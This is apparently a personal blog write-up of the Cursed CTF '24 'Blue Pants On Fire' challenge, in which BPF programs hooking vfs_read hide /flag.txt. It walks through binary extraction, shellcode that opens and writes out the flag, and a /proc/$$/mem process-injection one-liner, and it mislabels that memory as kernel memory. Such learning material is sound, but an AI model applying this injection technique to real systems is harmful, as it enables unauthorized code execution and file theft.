---
layout: post
title: "pwn blue-pants-on-fire"
date: 2024-04-01 00:00:00 -0700
categories: ctfs
description: Identify bpf is overwriting output of /flag.txt. Create shellcode to open and write contents of flag to stack, then read stack (instead of /flag.txt).
parent: Cursed CTF '24
grand_parent: CTF Events
event: "cursed-ctf"
tags:
- "rust"
- "pwn"
- "reverse engineering"
- "bpf"
---

## Blue Pants On Fire (BPF) - PWN challenge
This challenge began with an anti-spam proof-of-work script that routed you into a qemu-looking boot sequence followed by 'The flag is at /flag.txt. Good Luck!'. The goal was to bypass bpf filters that would hijack the contents of the output of flag.txt before it sent the string to stdout.

For my recommended reading on topics that I didn't understand, you can skip to the bottom.

### Recon
#### Tools
1. Basic shell commands (`nc`, `cat`, `tar`, `base64`, `tr`, `ls`)

#### Logging in
First user was greeted with a proof-of-work challenge. This seems to be a measure of keeping brute-forcing down and gives an interactive path to the author with which to generate routes to the challenge before allowing users into the actual challenge.
```sh
[12:23:59] tokugero :: pangolin  ➜  ~ » nc <redacted> 5000 | tee output
proof of work:
curl -sSfL https://pwn.red/pow | sh -s s.AAA6mA==.IYecQs5WM8psI1QUf8xxYg==
solution:
```

Looking into the source of the pwn.red/pow script, one can see it's just doing a download to a script that will do some math on the two outputs (+ version) to calculate a solution. The source code is also on github and linked in the script.
```sh
[12:23:40] tokugero :: pangolin  ➜  ~ » curl -sSfL https://pwn.red/pow | sh -s s.AAA6mA==.IYecQs5WM8psI1QUf8xxYg==
s.W2ACFYds5hFD0wgb6kr90ur/0b658a+OT1FoKUJNOPv5wAVuDlJhIzUNXG4M/L48Ood1xyWuFzvsLO9dhWkQw850ByS8Cp5X8D0/wblynsT8Qap4/hCu17yrtX3iHFSdoDqVj5nm6nEF2X8ADqQ/DH7b3WzEaIIx8odyO9bjvOz4fo+6I0SYqJEGyGlLZRLZDu7zqKpK1y3sGKfbbyhHYg==
```

After solving, you're greeted with a long post message indicating that this is a `qemu` vm spinning up with an `/init` script.
```sh
[    2.754164] Run /init as init process


Boot took 2.77 seconds

┏┓ ╻  ╻ ╻┏━╸   ┏━┓┏━┓┏┓╻╺┳╸┏━┓   ┏━┓┏┓╻   ┏━╸╻┏━┓┏━╸
┣┻┓┃  ┃ ┃┣╸    ┣━┛┣━┫┃┗┫ ┃ ┗━┓   ┃ ┃┃┗┫   ┣╸ ┃┣┳┛┣╸
┗━┛┗━╸┗━┛┗━╸   ╹  ╹ ╹╹ ╹ ╹ ┗━┛   ┗━┛╹ ╹   ╹  ╹╹┗╸┗━╸

Good luck :) Flag is at /flag.txt

[    2.958757] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    3.may corrupt user memory!1] is installing a program with bpf_probe_write_user helper that 
[    3.165430] blue-pants-on-f[1] is installing a program with bpf_probe_write_user helper that may corrupt user memory!
[    3.166298] blue-pants-on-f[1] is installing a program with bpf_probe_write_user helper that may corrupt user memory!
/bin/sh: can't access tty; job control turned off
```

Looking at the suggested file we see some silly text that is not the flag.
```sh
~ $ cat /flag.txt
cat /flag.txt
letmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletm~ $ 
```

We also have some interesting errors from the initial output as well:

`is installing a program with bpf_probe_write_user helper that may corrupt user memory!`

Some googling shows us that this is likely a dangerous BPF helper that can be used to write to user memory. This is likely the mechanism by which the flag is being overwritten.

Looking at the contents of /init we can see the script that's spawning and the binary that's ultimately ran.
```sh
~ $ cat /init
cat /init
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys

cat <<!


Boot took $(cut -d' ' -f1 /proc/uptime) seconds

┏┓ ╻  ╻ ╻┏━╸   ┏━┓┏━┓┏┓╻╺┳╸┏━┓   ┏━┓┏┓╻   ┏━╸╻┏━┓┏━╸
┣┻┓┃  ┃ ┃┣╸    ┣━┛┣━┫┃┗┫ ┃ ┗━┓   ┃ ┃┃┗┫   ┣╸ ┃┣┳┛┣╸
┗━┛┗━╸┗━┛┗━╸   ╹  ╹ ╹╹ ╹ ╹ ┗━┛   ┗━┛╹ ╹   ╹  ╹╹┗╸┗━╸

Good luck :) Flag is at /flag.txt

!
exec /sbin/blue-pants-on-fire
```

#### Exfiltrating binary
To understand what's happening, we'll need to exfiltrate this binary. By `tar`ing it to base64, we can copy the output and decode it on our local machine.
```sh
tar -cf - /sbin/blue-pants-on-fire | base64
```

```sh
[14:08:47] tokugero :: pangolin  ➜  pwn/bluepantsonfire/tmp » cat output | tr -d '\r\n' | base64 -d | tar -xv
sbin/blue-pants-on-fire
[14:08:51] tokugero :: pangolin  ➜  pwn/bluepantsonfire/tmp » ls -alhn sbin
total 2.5M
drwxr-xr-x 2 1000 1000 4.0K Apr  2 14:08 .
drwxr-xr-x 3 1000 1000 4.0K Apr  2 14:08 ..
-rwxr-xr-x 1 1000 1000 2.4M Mar 29 20:21 blue-pants-on-fire
```

### Understanding
#### Tools
1. strings
1. Ghidra
1. binwalk
1. objdump
1. strace
1. bpftools

#### Pulling out what we can
First is to look through `strings` output, here I'm just showing the really interesing bits that came out of the binary. We can see the goofy output embedded in the binary, indicating that it has something to do with the output.
```sh
[14:23:59] tokugero :: pangolin  ➜  bluepantsonfire/tmp/sbin » strings blue-pants-on-fire | grep let
state must have zero transitionsrelocating map by section index BPF_MAP_TYPE_REUSEPORT_SOCKARRAY/sys/devices/system/cpu/possiblethe program was already attachedenum relocation on non-enum type` overflows 16 bits offset fieldtwo or more symbols in section `index out of bounds: the len is library/core/src/fmt/builders.rslibrary/core/src/slice/memchr.rswarning: invalid regex filter - 
letmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutblue_pants_on_firesrc/main.rscouldn't read dentrycouldn't read name pointer is trying to read flagcouldn't read nameattempted read of flag, size: 
```

Binwalk is a useful tool for identifying embedded files in a binary. Here we can see that there are some files embedded in the binary, including another binary. 
```sh
[14:25:47] tokugero :: pangolin  ➜  bluepantsonfire/tmp/sbin » binwalk blue-pants-on-fire                                                             130 ↵

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
960605        0xEA85D         bix header, header size: 64 bytes, header CRC: 0x488B4D, created: 1974-04-15 08:43:32, image size: 21269365 bytes, Data Address: 0x4498B84, Entry Point: 0x24980200, data CRC: 0x490B84, image type: OS Kernel Image, compression type: none, image name: ""
1847008       0x1C2EE0        Unix path: /sys/devices/system/cpu/possiblethe program was already attachedenum relocation on non-enum type` overflows 16 bits offset field
1873152       0x1C9500        ELF, 64-bit LSB relocatable, version 1 (SYSV)
1970056       0x1E0F88        Unix path: /usr/local/bin:/bin:/usr/bin
```

We can even extract the embedded files directly.
```sh
[14:26:12] tokugero :: pangolin  ➜  bluepantsonfire/tmp/sbin » binwalk --dd='.*' blue-pants-on-fire 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
960605        0xEA85D         bix header, header size: 64 bytes, header CRC: 0x488B4D, created: 1974-04-15 08:43:32, image size: 21269365 bytes, Data Address: 0x4498B84, Entry Point: 0x24980200, data CRC: 0x490B84, image type: OS Kernel Image, compression type: none, image name: ""
1847008       0x1C2EE0        Unix path: /sys/devices/system/cpu/possiblethe program was already attachedenum relocation on non-enum type` overflows 16 bits offset field
1873152       0x1C9500        ELF, 64-bit LSB relocatable, version 1 (SYSV)
1970056       0x1E0F88        Unix path: /usr/local/bin:/bin:/usr/bin
[14:26:22] tokugero :: pangolin  ➜  bluepantsonfire/tmp/sbin » ls _blue-pants-on-fire.extracted 
0  1C2EE0  1C9500  1E0F88  EA85D
```

And trying strings again, we can confirm that this output is in the embedded binary, not in the parent binary. Research on writing BPF code tells us that one will use a higher level language like rust or c to generate BPF bytecode that is destined to the kernel BPF space, this way the kernel can do some JIT compiling with the byte-code to ensure it's more transferable between architectures. A very useful feature, but it means it'll be a bit harder for us to read as my normal toolbelt does not extract this bytecode very well. 
```sh
[14:28:32] tokugero :: pangolin  ➜  bluepantsonfire/tmp/sbin » strings _blue-pants-on-fire.extracted/1C2EE0 | head -n 20
...<SNIP>...
letmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutletmeoutblue_pants_on_firesrc/main.rscouldn't read dentrycouldn't read name pointer is trying to read flagcouldn't read nameattempted read of flag, size: 
```

Using objdump, however, on the extracted bytecode, we can see a few things that the bytecode has left unstripped, like the fact that the fentry (likely the entrypoint of our input, like read) is checking 'read', and fexit (likely the exit point of our output, like write). Since this is labeled as "read", we will need to assume that the the "read" syscall is being hijacked and not to be trusted... "liar liar, blue pants on fire"?

```sh
[14:44:59] tokugero :: pangolin  ➜  tmp/sbin/_blue-pants-on-fire.extracted » objdump -h 1C9500

1C9500:     file format elf64-little

Sections:
Idx Name          Size      VMA               LMA               File off  Algn
0 .text         00000350  0000000000000000  0000000000000000  00000040  2**3
                CONTENTS, ALLOC, LOAD, READONLY, CODE
1 fentry/vfs_read 00001d90  0000000000000000  0000000000000000  00000390  2**3
                CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE
2 fexit/vfs_read 00000838  0000000000000000  0000000000000000  00002120  2**3
                CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE
3 .rodata       00000112  0000000000000000  0000000000000000  00002958  2**0
                CONTENTS, ALLOC, LOAD, READONLY, DATA
4 maps          00000054  0000000000000000  0000000000000000  00002a6c  2**2
                CONTENTS, ALLOC, LOAD, DATA
```

Looking at the objdump with a guessed architecture (as others will complain about bad arch's anyway) shows us a bit more about what the bytecode is doing.
```sh
[14:49:02] tokugero :: pangolin  ➜  tmp/sbin/_blue-pants-on-fire.extracted » objdump -d -mi386 1C9500
...<SNIP>...
Disassembly of section fentry/vfs_read:

0000000000000000 <fentry_blue_pants_on_fire_read>:
    0:       bf 16 00 00 00          mov    $0x16,%edi
    5:       00 00                   add    %al,(%eax)
    7:       00 85 00 00 00 0e       add    %al,0xe000000(%ebp)
    d:       00 00                   add    %al,(%eax)
    f:       00 7b 0a                add    %bh,0xa(%ebx)
    12:       d0 ff                   sar    $1,%bh
    14:       00 00                   add    %al,(%eax)
    16:       00 00                   add    %al,(%eax)
    18:       bf a2 00 00 00          mov    $0xa2,%edi
    1d:       00 00                   add    %al,(%eax)
    1f:       00 07                   add    %al,(%edi)
    21:       02 00                   add    (%eax),%al
    23:       00 d0                   add    %dl,%al
    25:       ff                      (bad)
    26:       ff                      (bad)
    27:       ff 18                   lcall  *(%eax)
    29:       01 00                   add    %eax,(%eax)
    ...
    37:       00 85 00 00 00 03       add    %al,0x3000000(%ebp)
    3d:       00 00                   add    %al,(%eax)
    3f:       00 79 69                add    %bh,0x69(%ecx)
    42:       08 00                   or     %al,(%eax)
    44:       00 00                   add    %al,(%eax)
    46:       00 00                   add    %al,(%eax)
    48:       79 63                   jns    ad <fentry_blue_pants_on_fire_read+0xad>
    4a:       00 00                   add    %al,(%eax)
    4c:       00 00                   add    %al,(%eax)
    4e:       00 00                   add    %al,(%eax)
    50:       07                      pop    %es
    51:       03 00                   add    (%eax),%eax
    53:       00 a0 00 00 00 bf       add    %ah,-0x41000000(%eax)
    59:       a1 00 00 00 00          mov    0x0,%eax # 0 eax(syscall) is "read" https://filippo.io/linux-syscall-table/
    5e:       00 00                   add    %al,(%eax)
    60:       07                      pop    %es
    61:       01 00                   add    %eax,(%eax)
    63:       00 d8                   add    %bl,%al
    65:       ff                      (bad)
    66:       ff                      (bad)
    67:       ff b7 02 00 00 08       push   0x8000002(%edi)
    6d:       00 00                   add    %al,(%eax)
    6f:       00 85 00 00 00 71       add    %al,0x71000000(%ebp)
    75:       00 00                   add    %al,(%eax)
    77:       00 55 00                add    %dl,0x0(%ebp)
    7a:       e5 00                   in     $0x0,%eax # Again, 0 eax(syscall) is "read" https://filippo.io/linux-syscall-table/
    7c:       00 00                   add    %al,(%eax)
    7e:       00 00                   add    %al,(%eax)
    80:       79 a3                   jns    25 <fentry_blue_pants_on_fire_read+0x25>
    82:       d8 ff                   fdivr  %st(7),%st
    84:       00 00                   add    %al,(%eax)
    86:       00 00                   add    %al,(%eax)
    88:       07                      pop    %es
    89:       03 00                   add    (%eax),%eax
    8b:       00 28                   add    %ch,(%eax)
    8d:       00 00                   add    %al,(%eax)
    8f:       00 bf a1 00 00 00       add    %bh,0xa1(%edi)
    95:       00 00                   add    %al,(%eax)
    97:       00 07                   add    %al,(%edi)
    99:       01 00                   add    %eax,(%eax)
    9b:       00 d8                   add    %bl,%al
    9d:       ff                      (bad)
    9e:       ff                      (bad)
```

Research tells us that BPF programs are, by requirement and necessity, extremely small. To make a more intricate BPF program, an author can use `maps` to share data objects between the BPF programs. In this code we can see the maps that are created and where they're shared. However, at the time of this writing, I was unable to actually observe the data being written and shared in these maps as it cleared too quickly for me to catch. Maybe there's better tools out there for me to find in the future.
```sh
[14:53:20] tokugero :: pangolin  ➜  bluepantsonfire/tmp/sbin » sudo bpftool prog                                                                             
...<SNIP>...
39: tracing  name fentry_blue_pan  tag cbaa055b6728b557  gpl
    loaded_at 2024-04-02T14:52:06-0700  uid 0
    xlated 8104B  jited 4396B  memlock 8192B  map_ids 12,11,13,14
    pids blue-pants-on-f(14584)
40: tracing  name fexit_blue_pant  tag 0b1e0db2a5365e35  gpl
    loaded_at 2024-04-02T14:52:06-0700  uid 0
    xlated 2424B  jited 1339B  memlock 4096B  map_ids 12,11,13,14
    pids blue-pants-on-f(14584)
```
```sh
[15:05:39] tokugero :: pangolin  ➜  bluepantsonfire/tmp/sbin » sudo bpftool prog dump xlated id 39 | grep -E "(map|\#)" #sample output           1 ↵
1: (85) call bpf_get_current_pid_tgid#216480
5: (18) r1 = map[id:12]
7: (85) call htab_lru_map_delete_elem#255808
14: (85) call bpf_probe_read_kernel#-102192
21: (85) call bpf_probe_read_kernel#-102192
27: (18) r1 = map[id:11]
29: (85) call percpu_array_map_lookup_elem#266064
38: (18) r4 = map[id:13][0]+128
130: (18) r4 = map[id:13][0]+146
183: (18) r2 = map[id:13][0]+177
238: (18) r2 = map[id:14]
249: (18) r1 = map[id:11]
251: (85) call percpu_array_map_lookup_elem#266064
260: (18) r4 = map[id:13][0]+128
352: (18) r4 = map[id:13][0]+146
405: (18) r2 = map[id:13][0]+157
448: (18) r2 = map[id:14]
454: (85) call bpf_perf_event_output_raw_tp#-97168
463: (85) call pc+482#bpf_prog_9af5d65f957a4f79_F
467: (85) call bpf_probe_read_kernel_str#-101936
489: (18) r1 = map[id:11]
491: (85) call percpu_array_map_lookup_elem#266064
501: (18) r5 = map[id:13][0]+128
593: (18) r7 = map[id:13][0]+146
645: (18) r2 = map[id:13][0]+226
684: (18) r2 = map[id:14]
694: (85) call pc+259#bpf_prog_574d635fd9d96149_F
703: (18) r1 = map[id:11]
705: (85) call percpu_array_map_lookup_elem#266064
712: (18) r1 = map[id:12]
715: (85) call htab_lru_map_update_elem#257456
724: (18) r4 = map[id:13][0]+128
816: (18) r3 = map[id:13][0]+146
877: (85) call pc+112#bpf_prog_35afc7aded4e0a42_F
881: (85) call pc+115#bpf_prog_14cae5e813865f9a_F
889: (18) r2 = map[id:13][0]+203
938: (18) r2 = map[id:14]
944: (85) call bpf_perf_event_output_raw_tp#-97168
```

### Crafting the exploit
I didn't finish this challenge in the competition, and instead I read the author's write-up at this point. I understood that syscalls were being hijacked, and looking at the intended solution I could see my original assumption of "open" being the hijacked code was incorrect, but instead it was actually "read" that was triggering the BPF filter. From here on, this is me attempting to reverse engineer how the author intended the challengers to bypass this filter using raw syscalls and shellcode.

#### Tools
1. pwntools (shellcraft shell code generator)
2. read
3. exec
4. hope

Answer from the author; don't ask me about the magic of the wizard, I only know the legends of its arcane runes.
```sh
echo '<redacted-base64-payload>'|base64 -d > solution.bin && objdump -D -b binary -mi386:x86-64 solution.bin 

solution.bin:     file format binary


Disassembly of section .data:

0000000000000000 <.data>:
0:    50                       push   %rax
1:    48 31 d2                 xor    %rdx,%rdx
4:    48 31 f6                 xor    %rsi,%rsi
7:    56                       push   %rsi
8:    56                       push   %rsi 
9:    48 bb 66 6c 61 67 2e     movabs $0x7478742e67616c66,%rbx # flag.txt little-endian
10:    74 78 74 
13:    53                       push   %rbx # Flag location
14:    54                       push   %rsp 
15:    5f                       pop    %rdi
16:    b8 02 00 00 00           mov    $0x2,%eax # open syscall
1b:    0f 05                    syscall
1d:    49 90                    xchg   %rax,%r8
1f:    48 31 ff                 xor    %rdi,%rdi
22:    be 00 10 00 00           mov    $0x1000,%esi
27:    ba 01 00 00 00           mov    $0x1,%edx 
2c:    41 ba 02 00 00 00        mov    $0x2,%r10d 
32:    4d 31 c9                 xor    %r9,%r9
35:    b8 09 00 00 00           mov    $0x9,%eax # mmap syscall
3a:    0f 05                    syscall
3c:    48 96                    xchg   %rax,%rsi
3e:    ba 40 00 00 00           mov    $0x40,%edx
43:    bf 01 00 00 00           mov    $0x1,%edi
48:    b8 01 00 00 00           mov    $0x1,%eax # write syscall
4d:    0f 05                    syscall
```

This is what a hacker [fireball](https://www.youtube.com/watch?v=gmAub3iRWaU) looks like in terminal.
```sh
read a</proc/$$/syscall;exec 3>/proc/$$/mem;echo '<redacted-base64-payload>'|base64 -d|dd bs=1 seek=$(($(echo $a|cut -d" " -f9)))>&3
```

```python
# Note that this doesn't actually work as a payload... yet
open_flag = pwnlib.shellcraft.i386.linux.open("/flag.txt").rstrip()
mmap = pwnlib.shellcraft.i386.linux.syscall("SYS_mmap", 0x1000, 0x1000, 7, 50, 0, 0).rstrip()
write = pwnlib.shellcraft.i386.linux.syscall("SYS_write", 1, 0x100000, 0x1000).rstrip()

shellcode = b64e(asm(open_flag + mmap + write))
print(shellcode)
```
```sh
    /* open(file='/flag.txt', oflag=0, mode=0) */
    /* push b'/flag.txt\x00' */
    push 0x74
    push 0x78742e67
    push 0x616c662f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    /* call open() */
    push SYS_open /* 5 */
    pop eax
    int 0x80    /* call mmap(0x1000, 0x1000, 7, 0x32, 0, 0) */
    push SYS_mmap /* 0x5a */
    pop eax
    xor ebp, ebp
    xor ebx, ebx
    mov bh, 0x1000 >> 8
    xor edi, edi
    push 7
    pop edx
    push 0x32
    pop esi
    mov ecx, ebx
    int 0x80    /* call write(1, 0x100000, 0x1000) */
    push SYS_write /* 4 */
    pop eax
    push 1
    pop ebx
    mov ecx, (-1) ^ 0x100000
    not ecx
    xor edx, edx
    mov dh, 0x1000 >> 8
    int 0x80
```
This is the injection technique devised by the author. I found more detailed information about writing to memory fd's here: https://joev.dev/posts/unprivileged-process-injection-techniques-in-linux
```sh
read a</proc/$$/syscall;exec 3>/proc/$$/mem;echo '<redacted>'|base64 -d|dd bs=1 seek=$(($(echo $a|cut -d" " -f9)))>&3 
```

This is the breakdown of the technique used here
```sh
read a</proc/$$/syscall # Captures the current syscall stack into variable $a, specifically the "read" address at 9th position
exec 3>/proc/$$/mem # Opens a write file-handle to kernel memory
echo '<redacted>'| # The base64 encoded shellcode
    base64 -d| # Decodes the base64 shellcode
    dd bs=1 seek=$( # Writes the shellcode to the kernel memory at the last stack pointer address. When read is called, our payload is executed
        (
            $(echo $a| # outputs the syscall pointers
            cut -d" " -f9) # outputs the address of the read syscall
        )
    )>&3 # Writes the shellcode to the kernel memory at the desired location
```
### Things that didn't work
1. Random testing
2. Ghidra

This really took understanding what I was looking at. Without the hint from the challenge itself (__B__lue-__P__ants-on-__F__ire) and the errors that greet the user on login, I may never have found the bad-bpf defcon talk that really showed me what was possible with what I had previously assumed were just networking debug tools. Throwing Rust at Ghidra with all it's embedded packages, and the nested BPF bytecode wasted hours of my time trying to understand what ended up being basic libraries that were baked into the final binary.

I spent a lot of time looking through that binary for where "flag.txt" might have been referenced to work my way backwards. The `letmeoutletmeout` string did ultimately help me focus my attention where it mattered, but that also didn't really give me what I needed to solve the challenge. It forced me to take another look at the (what seemed like magic at first) `objdump` and `dd` tools to extract information. Once I started allowing myself to explore the parameters and tools, these made a big difference in how I approached the challenge.

Unfortunately, I kept using my frustration-breaks to look for tools in the included `busybox` bin that might give me a tool that didn't really read a file but might give me what I needed to get the file. Locally on my system I was able to copy the flag to another file to see the contents, but this challenge had no such writeable directory. `exec` opening and managing file handles got me closer, but still ultimately weren't sufficient. In these cases, I determined it's best to just accept the suck and start learning how to inject shellcode. Even though it seems complex and scary, it'll be an absolutely essential tool to give me the flexibility to no longer depend on these built-ins in the future. It also helps me really appreciate how little security one has once someone gets access to a box, so maybe it will help me realize how much I have to go to harden my own systems moving forward.

### Conclusion
This challenge really pushed my understanding of how kernels and memory works in the Linux system itself. In addition, it exposed an entire set of techniques for debugging of which I was entirely ignorant. I think this is a really good way to show that even if the challenge feels insurmountable, there's something to be gained from the failure of the experience. I'm really glad I took the time to look into this challenge and I hope I can apply these learnings soon.

I'm going to keep looking for ways to craft this payload myself. As of the time of this writing, I haven't gotten it working yet, but need to move to other things and come back to this at another time. If/when I get it working, I'll update this post with the working payload and how I arrived at whatever answer that might be.

#### Links
* [bad-bpf defcon talk](https://www.youtube.com/watch?v=g6SKWT7sROQ)
* [bad-bpf examples](https://github.com/pathtofile/bad-bpf)
* [What is /proc/*/mem](https://blog.cloudflare.com/diving-into-proc-pid-mem)
* [Generating Shellcode in Rust](https://kerkour.com/shellcode-in-rust)
* [Generating Shellcode in Python](https://docs.pwntools.com/en/stable/shellcraft/i386.html)
* [Bypassing seccomp](https://jade.fyi/blog/writeonly-in-rust)
* [Syscall tables](https://filippo.io/linux-syscall-table/)
* [read syscall](https://manpages.debian.org/unstable/manpages-dev/read.2.en.html)
* [mmap syscall](https://manpages.debian.org/unstable/manpages-dev/mmap.2.en.html)
* [write syscall](https://manpages.debian.org/unstable/manpages-dev/write.2.en.html)
* [open syscall](https://manpages.debian.org/unstable/manpages-dev/open.2.en.html)
* [Unprivileged process injection technique](https://joev.dev/posts/unprivileged-process-injection-techniques-in-linux)
* [Getting at the core(dump)](https://debugging.works/blog/analyzing-linux-coredump/)
